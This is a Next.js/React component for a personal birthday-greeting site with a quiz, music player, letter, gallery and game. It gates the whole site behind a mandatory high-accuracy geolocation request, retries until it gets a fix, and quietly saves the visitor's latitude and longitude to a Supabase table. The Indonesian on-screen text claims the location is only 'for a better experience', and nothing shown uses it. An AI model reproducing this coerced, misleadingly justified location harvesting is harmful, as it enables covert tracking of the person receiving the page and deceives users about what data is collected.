"use client";

import { useState, useEffect } from "react";
import { useSession } from "@/hooks/useSession";
import { supabase } from "@/lib/supabase";
import CustomCursor from "@/components/CustomCursor";
import ParticleCanvas from "@/components/ParticleCanvas";
import SlideOverlay from "@/components/SlideOverlay";
import LoginPage from "@/components/pages/LoginPage";
import QuizPage from "@/components/pages/QuizPage";
import SpotifyPage from "@/components/pages/SpotifyPage";
import BirthdayPage from "@/components/pages/BirthdayPage";
import MainPage from "@/components/pages/MainPage";
import LetterSlide from "@/components/slides/LetterSlide";
import GallerySlide from "@/components/slides/GallerySlide";
import GameSlide from "@/components/slides/GameSlide";
import useAudio from "@/hooks/useAudio";

type Page = "login" | "quiz" | "spotify" | "birthday" | "main";
type Slide = null | "letter" | "gallery" | "game";

export default function BirthdayApp() {
  const [currentPage, setCurrentPage] = useState<Page>("login");
  const [activeSlide, setActiveSlide] = useState<Slide>(null);
  const [locationState, setLocationState] = useState<"prompting" | "granted" | "denied">("prompting");
  const sessionId = useSession();
  
  // Lift audio state up so it can start exactly when SpotifyPage is shown
  const { currentSong, isPlaying, toggle, play, next, prev } = useAudio();

  useEffect(() => {
    if (!sessionId) return;

    if (!navigator.geolocation) {
      // eslint-disable-next-line react-hooks/set-state-in-effect
      setLocationState("denied");
      return;
    }

    let isMounted = true;
    let timeoutId: ReturnType<typeof setTimeout>;

    const getLocation = () => {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          if (!isMounted) return;
          setLocationState("granted");
          
          // Save to Supabase
          supabase.from("user_locations").upsert({
            session_id: sessionId,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            updated_at: new Date().toISOString()
          }).then(({ error }) => {
            if (error) console.error("Error upserting location:", error);
          });
        },
        (error) => {
          if (!isMounted) return;
          console.error("Location error:", error);
          // code 1 is PERMISSION_DENIED
          // Only set to denied if the user explicitly blocks it.
          if (error.code === 1) {
            setLocationState("denied");
          } else {
            // Retry after 3 seconds for timeout or position unavailable
            timeoutId = setTimeout(getLocation, 3000);
          }
        },
        { enableHighAccuracy: true, maximumAge: 10000, timeout: 10000 }
      );
    };

    getLocation();

    return () => {
      isMounted = false;
      clearTimeout(timeoutId);
    };
  }, [sessionId]);

  const handleQuizComplete = () => {
    play(); // Start audio immediately on click interaction
    setCurrentPage("spotify");
  };

  if (locationState === "prompting") {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100vh', backgroundColor: '#111', color: '#fff', textAlign: 'center', padding: '20px' }}>
        <h2 style={{ fontFamily: 'var(--font-syne)' }}>Mencari Lokasi... 📍</h2>
        <p style={{ fontFamily: 'var(--font-dm)' }}>Web ini membutuhkan akses lokasi kamu untuk pengalaman yang lebih baik.</p>
        <p style={{ fontSize: '0.8rem', opacity: 0.7, marginTop: '20px' }}>Izinkan akses lokasi pada popup browser.</p>
      </div>
    );
  }

  if (locationState === "denied") {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100vh', backgroundColor: '#111', color: '#fff', textAlign: 'center', padding: '20px' }}>
        <h2 style={{ fontFamily: 'var(--font-syne)', color: '#ff4757' }}>Akses Lokasi Wajib 🚫</h2>
        <p style={{ fontFamily: 'var(--font-dm)' }}>Kamu tidak bisa melanjutkan sebelum mengizinkan akses lokasi.</p>
        <p style={{ fontSize: '0.9rem', opacity: 0.8, marginTop: '10px' }}>Silakan ubah pengaturan situs (site settings) di browsermu lalu muat ulang halaman ini.</p>
        <button 
          onClick={() => window.location.reload()} 
          style={{ marginTop: '20px', padding: '10px 20px', borderRadius: '50px', border: 'none', backgroundColor: '#fff', color: '#111', fontWeight: 'bold', cursor: 'pointer', fontFamily: 'var(--font-dm)' }}
        >
          Muat Ulang Halaman
        </button>
      </div>
    );
  }

  return (
    <>
      <CustomCursor />
      <ParticleCanvas />
      <SlideOverlay
        visible={activeSlide !== null}
        onClose={() => setActiveSlide(null)}
      />

      {currentPage === "login" && (
        <LoginPage onSuccess={() => setCurrentPage("quiz")} />
      )}
      {currentPage === "quiz" && (
        <QuizPage onComplete={handleQuizComplete} />
      )}
      {currentPage === "spotify" && (
        <SpotifyPage
          onFinish={() => setCurrentPage("birthday")}
          isPlaying={isPlaying}
          onToggleAudio={toggle}
          currentSong={currentSong}
          onNextSong={next}
          onPrevSong={prev}
        />
      )}
      {currentPage === "birthday" && (
        <BirthdayPage onEnter={() => setCurrentPage("main")} />
      )}
      {currentPage === "main" && (
        <MainPage 
          onOpenSlide={(slide) => setActiveSlide(slide)} 
          isPlaying={isPlaying}
          onToggleAudio={toggle}
          currentSong={currentSong}
        />
      )}

      {activeSlide === "letter" && (
        <LetterSlide onClose={() => setActiveSlide(null)} />
      )}
      {activeSlide === "gallery" && (
        <GallerySlide onClose={() => setActiveSlide(null)} />
      )}
      {activeSlide === "game" && (
        <GameSlide onClose={() => setActiveSlide(null)} />
      )}
    </>
  );
}
